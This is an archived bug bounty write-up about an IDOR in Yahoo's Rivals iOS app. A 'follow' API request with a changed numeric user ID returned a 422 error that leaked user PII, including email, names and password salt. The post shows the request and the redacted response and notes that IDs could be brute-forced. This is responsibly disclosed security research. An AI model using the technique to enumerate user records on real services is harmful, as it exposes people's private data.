---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-03-22_story-about-more-than-35-million-pii-leakage-in-yahoo.md
original_filename: 2022-03-22_story-about-more-than-35-million-pii-leakage-in-yahoo.md
title: Story about more than 3.5 million PII leakage in Yahoo!!!
category: documents
detected_topics:
- mobile-security
- xss
- idor
- access-control
- command-injection
- otp
tags:
- imported
- documents
- mobile-security
- xss
- idor
- access-control
- command-injection
- otp
language: en
raw_sha256: 7851b057a597d134bb7d75ea2bd21956a3befbc94e4b663082fd7f9baf5e516e
text_sha256: d501cb39abb3611cbe496036174dcc83e6d34dd260de0dfbc922a1b2f624d620
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# Story about more than 3.5 million PII leakage in Yahoo!!!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-03-22_story-about-more-than-35-million-pii-leakage-in-yahoo.md
- Source Type: markdown
- Detected Topics: mobile-security, xss, idor, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `7851b057a597d134bb7d75ea2bd21956a3befbc94e4b663082fd7f9baf5e516e`
- Text SHA256: `d501cb39abb3611cbe496036174dcc83e6d34dd260de0dfbc922a1b2f624d620`


## Content

---
title: "Story about more than 3.5 million PII leakage in Yahoo!!!"
url: "https://dhakalbibek.medium.com/story-about-more-than-3-5-million-pii-leakage-in-yahoo-3a530210dcc6"
authors: ["dhakal_bibek (@dhakal__bibek)"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["IDOR", "Information disclosure", "iOS"]
bounty: "9,500"
publication_date: "2022-03-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2793
scraped_via: "browseros"
---

# Story about more than 3.5 million PII leakage in Yahoo!!!

Story about more than 3.5 million PII leakage in Yahoo!!! (Using an IOS) Bug worth $9,500
dhakal_bibek
Follow
6 min read
·
Mar 22, 2022

427

2

Hello GUYS,

This is my first writeup and please accept my apologies for any inconvenience. Let’s get started with the writeup.

It all began on the day before Dashain, when my uncle gifted me an iPhone X. For the past four years, I’ve been staunchly opposed to smart phones. I used to have a Nokia flip phone before that. Allow me to insert a photo of my iconic Nokia 6101b phone.

Press enter or click to view image in full size

Yep, I had stopped using smart phone for about 4 years. Since the day I got the gift, I started using smart phone. After getting my hands on that iPhone, I began to jailbreak it. Everyone was against the idea of jailbreaking a brand new iPhone, even 
Ananda Dhakal
. It was a rare footage of me using a smart phone and he was afraid to not let me lose that phone already. He had not even taken picture with that phone yet XD.

I was like, “Lets just ignore the background noise” and connected my phone through USB cable and began the process(we are in!!).

Jailbreaking allowed me install some of the great tweaks and tools like AppSync Unified, AppStore++, Filza,Frida, Gravitation(just for swag.), mTerminal, Nonceset143(to safely store your BOLBS), OpenSSH, SSL kill Switch2,mobileAssistant(burpSuite), etc..

Press enter or click to view image in full size

After some weeks of research I was ready to test on iOS applications. I had found some small and medium servility issues on some private programs using my API testing methodologies. Since, I was not satisfied with small fish of the pond. It was time to hunt for a whale of the ocean. So, I started looking for bugs on yahoo.

It was just before the day we were planning to go for rafting in Bhotekoshi. Since, we were planning to get there before 10 am, nobody was allowed to stay beyond the 10 PM that night to get a proper sleep. Why? Cuz the great adventure was waiting for us.

It was in between 9:10–30 PM. So, I fired up the mobileAssistant tool and setup the burp proxy and injected the proxy on rivals iOS application.

Press enter or click to view image in full size

As it had been more than a week without a hunt due to the festivals and occasions, I was hungry for the bugs.

After poking around a bit with the Rivals iOS application, I started analyzing the request and response using the burp history tab. A suspicious request got my attention. It was a simple POST request to follow some user, and the request was something like /api/v1/user/3123XXX/follow. The ID was numeric, and the first thing came in my mind was to change that ID. I did what my subconscious told me to do. I changed the id to a random one. To my surprise, it returned a 422 error. I was about to look away but when I looked at the response, my heart started pounding. All the PII of users were leaked in the response tab even though it was a 422 error.

Press enter or click to view image in full size

Now what? Since the user id were numeric, it is a child’s play to brute force the user ids and get all the private information of users. If found by a malicious user, it would have been a massive data breach. More than 3 million user’s information was leaked due to this bug, and I found it with 20 minutes of testing. I was happy as hell.

HTTP request:

POST /api/v1/user/3123911/follow HTTP/1.1
Host: n.rivals.com
Accept: application/json
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
If-None-Match: XXXXxxxXXXXX
Cookie: _rivalry_session_v2=XXXXXxxxxXXXXXX
Authorization: token XXXXXxxxxxXXXXXX
Content-Length: 33
Accept-Language: en-us{"follow":{"type":"Site","id":1}}

HTTP Response:

HTTP/1.1 422 Unprocessable Entity
Cache-Control: max-age=0
Content-Type: application/json; charset=utf-8
Date: Sun, 07 Nov 2021 15:55:44 GMT
Expires: Sun, 07 Nov 2021 15:55:44 GMT
Referrer-Policy: no-referrer-when-downgrade
Server: ATS
Set-Cookie: _rivalry_session_v2=XXXXXXXxxxxxXXXXXX
Status: 422 Unprocessable Entity
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
x-ittl: 0:15m
X-Permitted-Cross-Domain-Policies: none
X-Powered-By: Phusion Passenger(R)
x-pver: 2.85A
X-Request-Id: XXXXxxxxxXXXXX
X-Runtime: 0.015939
X-XSS-Protection: 1; mode=block
Age: 0
Connection: close
Expect-CT: max-age=31536000, report-uri="http://csp.yahoo.com/beacon/csp?src=yahoocom-expect-ct-report-only"
Content-Length: 1124{"message":"not allowed to follow? this #\u003cUser id: 3123XXX, email: \"victim101@gmail.com\", username: \"VictimName\", terms_and_conditions_accepted_at: \"2021-04-08 23:06:11\", created_at: \"2021-04-08 23:06:11\", updated_at: \"2021-07-25 22:41:56\", braintree_customer_id: nil, role: \"user\", legacy_password_hash: nil, first_name: \"victim\", last_name: \"bicharaBabu\", phone_number: nil, legacy_guid: nil, legacy_id: nil, legacy_password_changedate: nil, comped_all_sites: false, rivals_emails: nil, third_party_emails: nil, banned: false, title: nil, affiliated_site_id: 25, incentive_mail_send_count: 0, email_opt_out_date: nil, comp_all_sites_until: nil, obi_instrument_id: \"9659xxxx\", salt: \"XXXXXXXXXxxxxxxXXXXX\", guce_tos_record: [], accepted_events: nil, is_analyst: nil, obi_customer_id: \"rivalscom-0a6285910d26XXXXxxxxXXX\", inappropriate_username: false, refer_friend_id: nil, inappropriate_user_photo: nil, user_login_token: nil, login_token_valid_until: nil, saved_from_cancellation: nil, compromised: nil, forecast_ban: nil, customer_support_admin_expiration_date: nil\u003e"}

Reward:

Since, the report was small and those PII’s din’t need any other explanations, team decided to Give (10%) bonus.

Get dhakal_bibek’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Yahoo! rewarded dhakal_bibek with a $5,000 bounty and a $4,500 bonus.
Bonus Hidden Gem x1 = $4,000
Bonus Excellent Report Quality x1 (@10%) = $500
Thank you for this submission. Please keep up the great work! Feedback about the Yahoo Bug Bounty program may be submitted directly to us.
TOTAL = $9500

BUG STATUS:

Bug Reported: Nov 7th (4 months ago)

Triaged: Nov 9th (4 months ago)

Resolved: Nov 9th (4 months ago)

Bounty Awarded: Dec 30th (2 months ago)

Writeup Published: 14 March 2022 ( Today )

Press enter or click to view image in full size
Press enter or click to view image in full size

Guys, I will be writing my other writeups soon. Writeup about 10 million PII’s(GraphQL) leakage is coming soon. Guys don’t update your iOS version if you are willing to jailbreak and get into the iOS hacking journey.

I hope you enjoyed this story, feel free to follow me on Twitter/Instagram and clap to this story, until next time.

https://twitter.com/dhakal__bibek
https://www.instagram.com/dhakal_bibk/

Till then, バイバイ.

#GOT APPROVAL

Guys, I am excited to announce that after 7 years, Yahoo has now opened up a process for public disclosure! Guys, this is the first writeup to get official permission from yahoo!! #loveYahoo

Press enter or click to view image in full size
Press enter or click to view image in full size
Some of the helpful Links:
Mobexler - Mobile Application Penetration Testing Platform
APK files and Information Gathering Getting APK files and gathering info Get the Application directly from the client…

mobexler.com

Mobile Hacking
This learning track is dedicated to learning the most popular mobile vulnerabilities in both Android and iOS…

www.hacker101.com

Installing Burp Suite Mobile Assistant
PROFESSIONAL COMMUNITY Burp Suite Mobile Assistant is a tool to facilitate testing of iOS apps with Burp Suite. It…

portswigger.net

Extract IPA from Jailbroken iOS 11 Device
After IPA Installer stopped supporting at iOS 8 in 2015, I often find the ways to extract IPA form applications…

medium.com

Mobexler - Mobile Application Penetration Testing Platform
This application provides display and control of Android devices connected on USB (or over TCP/IP). It does not require…

mobexler.com

GitHub - ansjdnakjdnajkd/iOS: Most usable tools for iOS penetration testing
https://github.com/ealeksandrov/ProvisionQL - Generate amazing preview for .ipa .app .appex .mobileprovision…

github.com

GitHub - OWASP/owasp-mstg at v1.4.0
The Mobile Security Testing Guide (MSTG) is a comprehensive manual for mobile app security testing and reverse…

github.com
